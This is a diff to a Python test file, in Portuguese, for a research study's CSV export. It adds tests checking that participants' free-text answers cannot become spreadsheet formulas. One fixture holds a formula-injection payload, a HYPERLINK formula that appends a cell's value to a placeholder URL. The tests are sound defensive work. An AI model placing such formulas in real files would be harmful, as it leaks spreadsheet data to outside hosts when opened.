@@ -47,7 +47,8 @@ def coleta(tmp_path_factory, d):
         def roda(participante, arm, *, erro=None, confianca="tenho certeza"):
             j = c.post("/sessions", json={
                 "participant": participante, "arm": arm,
-                "kc_sequence": ["kc_09"]}).json()
+                "kc_sequence": ["kc_09"], "consented": True,
+                "prior_c": d.study.prior_c_options[1]}).json()
             sid = j["session_id"]
             primeira = True
             for _ in range(200):
@@ -312,3 +313,60 @@ def test_cli_escreve_os_tres_arquivos(coleta, d, tmp_path, monkeypatch):
     assert export.main(["--db", str(banco), "--out", str(destino)]) == 0
     for nome in ("answers.csv", "sessions.csv", "calibration.csv"):
         assert (destino / nome).exists()
+
+
+# --------------------------------------------------------------------------
+# Injeção de fórmula
+# --------------------------------------------------------------------------
+
+def test_resposta_livre_nao_vira_formula_na_planilha(d, tmp_path):
+    """As CIUs de lacuna aceitam texto do participante, e esse texto vai
+    direto para uma planilha que o pesquisador abre. Sem neutralizar, um
+    `=HYPERLINK(...)` seria EXECUTADO ao abrir answers.csv."""
+    banco = tmp_path / "injecao.db"
+    conn = store_events.open_db(banco)
+    try:
+        store_events.add_participant(conn, "P01", "socratic", "x")
+        sid = store_events.start_session(conn, "P01", "socratic", ["kc_11"], "h")
+        store_events.append(conn, sid, "answer_submitted", {
+            "ciu_id": "ciu_kc11_003", "kc": "kc_11", "option_idx": None,
+            "text": '=HYPERLINK("http://exemplo/"&A1,"clique")',
+            "confidence": "chutei", "elapsed_ms": 10, "correct": False})
+        saida = tmp_path / "csv"
+        export.exporta(conn, d, saida)
+    finally:
+        conn.close()
+
+    with (saida / "answers.csv").open(encoding="utf-8-sig", newline="") as f:
+        linhas = list(csv.reader(f))
+    for linha in linhas[1:]:
+        for celula in linha:
+            assert not celula.startswith(("=", "+", "@")), celula
+
+    resposta = linhas[1][linhas[0].index("response_text")]
+    assert resposta.startswith("'="), "a formula tem de sair inerte"
+    assert "HYPERLINK" in resposta, "o dado tem de continuar la"
+
+
+def test_resposta_de_lacuna_sai_crua_e_legivel(coleta, d, tmp_path):
+    """O analista tem de ver `*(a + i)`, não `"*(a + i)"`."""
+    banco = tmp_path / "livre.db"
+    conn = store_events.open_db(banco)
+    try:
+        store_events.add_participant(conn, "P01", "socratic", "x")
+        sid = store_events.start_session(conn, "P01", "socratic", ["kc_11"], "h")
+        store_events.append(conn, sid, "answer_submitted", {
+            "ciu_id": "ciu_kc11_003", "kc": "kc_11", "option_idx": None,
+            "text": "*(a + i)", "confidence": "tenho certeza",
+            "elapsed_ms": 10, "correct": True})
+        saida = tmp_path / "csv2"
+        export.exporta(conn, d, saida)
+    finally:
+        conn.close()
+    assert le(saida / "answers.csv")[0]["response_text"] == "*(a + i)"
+
+
+def test_neutraliza_preserva_o_que_nao_e_perigoso():
+    assert export.neutraliza("*(a + i)") == "*(a + i)"
+    assert export.neutraliza("=1+1") == "'=1+1"
+    assert export.neutraliza(42) == 42
